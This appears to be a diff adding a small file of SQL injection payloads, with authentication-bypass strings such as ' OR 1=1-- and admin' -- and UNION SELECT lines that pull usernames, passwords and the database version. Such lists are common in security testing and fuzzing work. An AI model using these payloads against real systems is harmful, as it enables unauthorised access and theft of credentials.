@@ -1,0 +1,6 @@
+' OR '1'='1
+" OR ""="
+' OR 1=1--
+admin' --
+' UNION SELECT username, password FROM users--
+1 UNION ALL SELECT NULL, @@version, NULL, NULL--
